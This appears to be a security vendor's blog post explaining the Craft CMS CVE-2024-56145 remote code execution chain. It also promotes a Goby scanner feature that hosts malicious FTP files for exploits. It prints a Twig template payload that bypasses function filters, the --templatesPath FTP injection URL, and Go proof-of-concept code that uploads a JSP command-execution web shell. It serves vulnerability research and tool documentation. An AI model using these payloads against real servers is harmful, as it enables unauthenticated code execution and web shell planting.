**Preface**

In the first installment of the EXP Capability Upgrade series, we focused on the Oracle E-Business Suite vulnerability CVE-2025-61882. By introducing a new independent HTTP service instance, we achieved custom path configuration and multi-user service isolation, thereby streamlining the path adaptation exploitation chain. (You can read the first part via the link at the end of this article).

In this second part, we shift our focus to another common vulnerability exploitation scenario. Using the Craft CMS remote code execution vulnerability CVE-2024-56145 as an example, we will demonstrate how Goby dissects the exploitation principle of vulnerabilities that require a dependent FTP service to host malicious files for achieving RCE, and showcase the corresponding upgrade in Goby's custom FTP service capability.



**CVE-2024-56145 Vulnerability Principle and Exploitation Chain Analysis**

Craft CMS, a widely used content management system, has a configuration flaw in PHP environments that serves as a key entry point for attackers. The CVE-2024-56145 vulnerability is rated as "Critical." Its core risk lies in enabling remote code execution (RCE) without requiring authentication. The trigger condition for this vulnerability depends on whether the `register_argc_argv`parameter is enabled in the server's PHP configuration.

**Key Prerequisite for Vulnerability Triggering**

`register_argc_argv`is a PHP environment variable configuration option. When enabled, it stores command-line arguments in the `$argc`(argument count) and `$argv`(argument array) variables. Normally, this configuration is primarily used for command-line script development. However, when Craft CMS fails to implement strict validation on the parameter parsing logic under this configuration scenario, it creates a potential vulnerability. Under the default PHP configuration, an attacker can control the contents of the `$_SERVER['argv']`array via the query string.

**Complete Exploitation Chain Breakdown**

The attacker's exploitation process can be divided into three core steps:

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5544f9fac410016bc2b413cb6a283517f75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602afa4cc552274ccc03fa32b5579e222792102bcb7dbd1f87a40591535e60e615d0a4b5493d1216f66835d178f139091cc3?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)

1.Setting up a Malicious FTP Server

The attacker first needs to deploy a remote FTP server (requiring authentication credentials) and place a specially crafted malicious Twig template file on it. Twig is the default template engine used by Craft CMS. Although it cannot directly execute PHP code, an attacker can leverage Twig's template injection functionality to indirectly execute system commands using built-in filters and functions. Since Craft CMS filters dangerous functions, the attacker needs to construct a specific payload to bypass security restrictions, for example:

```
{{ ['system', 'ls'] | sort('call_user_func') | join('') }}
```

This exploits the characteristic that the `sort`filter calls a comparison function, indirectly executing `call_user_func('system', 'id')`.

2.Crafting a Specific HTTP Request

The attacker sends an HTTP request to the target Craft CMS site, embedding a critical parameter in the URL`?--templatesPath=ftp://user:pass@server:port/`. The key trick here is that `--templatesPath`is originally a parameter used in Craft CMS's command-line mode to specify the template path. However, because the `register_argc_argv`configuration is enabled and Craft CMS does not validate the runtime environment, the system mistakenly interprets these parameters from the HTTP request as command-line configuration options, thus bypassing the normal path validation logic.

3.Template Loading and Code Execution

When Craft CMS receives this request, it follows the parsing logic for "command-line arguments" and uses the FTP address pointed to by `--templatesPath`as the source for loading template files. The system automatically connects to the attacker-controlled FTP server, downloads, and parses the malicious Twig template. Crucially, the FTP wrapper supports `file_exists()`checks (this is the key reason FTP, not HTTP, is chosen for this exploit), allowing it to pass Craft CMS's file existence verification. Finally, the specially crafted Twig template is rendered and executed on the server, achieving remote code execution.

**From Cumbersome to Efficient: Goby Tackles FTP-Dependent Vulnerability Debugging Issues**

However, when security researchers write EXP for this type of vulnerability, if they attempt to implement the complete exploitation chain by manually setting up an FTP server, they need to place a file containing the preset malicious command content in the FTP directory first, and then send the payload for vulnerability exploitation.

This leads to a problem: if the command to be executed needs to be modified, the researcher must manually go back and modify the content of the corresponding malicious file in the FTP directory for debugging, then send a new payload request. For different specific vulnerability scenarios, different file configuration operations might be needed. This undoubtedly adds a lot of tedious work to the vulnerability research process.

The Goby EXP module addresses this issue with an upgrade – the new CustomFtpReqmethod. Security researchers only need to focus on the payload to be executed. The **CustomFtpReq****method can automatically start a custom public FTP service, and the CustomFtpUploadFilefunction automatically creates/modifies the corresponding file type and content based on the payload in the specified directory,** providing significant convenience and efficiency improvements to the workflow.

The general structure and implementation flow are illustrated in the diagram below:

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5544f9fac410016bc2b413cb6a283517f75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a7a5c135778ee098c24418c6c5439525cc48de09fb31ea8095af10d7ea91cc0d9a8ad74ed59427b1735bcd3e49f2e8015?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)

**CustomFtpReq** **Struct Parameters**

Used for starting custom FTP service configuration

| **Parameter Name** | **Type** | **Default Value** | **Description**                 | **Restrictions and Notes**                                   |
| ------------------ | -------- | ----------------- | ------------------------------- | ------------------------------------------------------------ |
| **MaxFileSize**    | int64    | 124KB             | Maximum file size limit (bytes) | Must be a positive numberAutomatically set to 124KB if less than or equal to 0Recommended to set a reasonable size based on actual needs |
| **Timeout**        | int      | 60                | Connection timeout (seconds)    | - Must be a positive number- Automatically set to 60 if less than or equal to 0- Only affects FTP connection timeout, does not affect service lifetime |

**CustomFtpInfo Struct Parameters (Return Value)**

| **Parameter Name** | **Type** | **Description**             | **Usage Scenario**                              |
| ------------------ | -------- | --------------------------- | ----------------------------------------------- |
| **FtpUrl**         | string   | Complete FTP connection URL | Can be directly used for FTP client connections |
| **Host**           | string   | FTP host address            | Used for constructing custom URLs               |
| **Port**           | int      | FTP port                    | Used for constructing custom URLs               |
| **MaxFileSize**    | int64    | Maximum file size limit     | Validating uploaded file size                   |
| **Timeout**        | int      | Connection timeout          | FTP client connection timeout setting           |
| **ServiceId**      | string   | Service ID                  | Service identification and debugging            |

**Usage Example in a Practical POC**

```
// Create custom FTP service
req := godclient.CustomFtpReq{
    MaxFileSize: 1024 * 1024, // 1MB file size limit
    Timeout:     30,          // 30-second timeout
}

ftpInfo, err := godclient.CreateCustomFtp(req)
if err != nil {
    return "", nil
}

// Upload malicious file to FTP server
maliciousContent := "<%@ page language='java' %><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
filename = "shell.jsp"

err = godclient.CustomFtpUploadFile(ftpInfo, filename, maliciousContent, 10)
if err != nil {
    return "", nil
}

// Build attack payload, using the uploaded FTP file path
payload := fmt.Sprintf(`http://target.com/path/include.jsp?file=ftp://%s:%d/%s`,
    ftpInfo.Host, ftpInfo.Port, filename)

// Launch attack request
cfg := httpclient.NewGetRequestConfig("/vulnerable/endpoint")
cfg.Params.Add("url", payload)
resp, err := jsonvul.DoHttpRequestWithBaseDir(u, cfg)
if err != nil || resp.StatusCode != 200 {
    return "", nil
}
```



**Detailed Explanation of Custom FTP Service Practical Capability Using CVE-2024-56145 as an Example**

After using the CustomFtpInfomethod, the process of automatically setting up and uploading malicious command content via the FTP service is achieved. The complete detection and exploitation process can be accomplished in just two steps:

Step 1: Start FTP Service and Upload File

```
        res, err := godclient.CreatCustomFtp(godclient.CustomFtpReq{
			MaxFileSize: 124 * 1024,
			Timeout:     180,
		})
		if err != nil {
			return "", "", nil
		}
		err = godclient.CustomFtpUploadFile(res, "index.twig", payload, 10)
		if err != nil {
			return "", "", nil
		}
```

FTP server startup effect. The content of the index.twig file is designed to output a random string.

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a27905087190dd0b93240f6e017d6e568f1a9f132d8163af43aacd57e8742a8315ab355d5ab6e4a61849d33546dfd7e43?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)

Step 2: Check for code execution effect by sending the vulnerability verification packet and examining the target server's response.

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a8169d9d9ddf3b83f77a9ac5cc097a3b32e696d4c0abac76c7ee89f9da5b9be62f24a0d53e59d9c97627eb4945ccbb350?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a8169d9d9ddf3b83f77a9ac5cc097a3b32e696d4c0abac76c7ee89f9da5b9be62f24a0d53e59d9c97627eb4945ccbb350?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)

**The final one-click verification and exploitation effect in Goby is shown in the video:**

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a0d50ecb3f30f832e9293d80e737db4d52fa5e914b7d597972926085452febd72ddb0c85495a340837e6beb538f57bca3?tmpCode=2f1dd5e4-dd15-4a69-84df-76b4142f8101)



**Summary**

From the CreateCustomHttpmethod in the first part addressing the "fixed path" problem, to the CustomFtpInfomethod in this part focusing on "FTP service dependency," the core of Goby's EXP capability upgrades consistently revolves around solving "practical pain points" in specific scenarios. In the vulnerability exploitation practice of CVE-2024-56145, the custom FTP service capability not only simplifies the vulnerability verification process but also, through standardized service configuration, makes vulnerability research more efficient.

In the next installment, we will focus on the fake-mysql capability upgrade, addressing vulnerability scenarios like JDBC connection deserialization detection and exploitation, aiming to achieve capabilities like reading client files or executing commands. Stay tuned for the third technical sharing session!

 We also welcome all experienced researchers to communicate any issues or suggestions encountered during the Goby EXP process. The Bot will collect your questions and suggestions to guide our next upgrade direction.
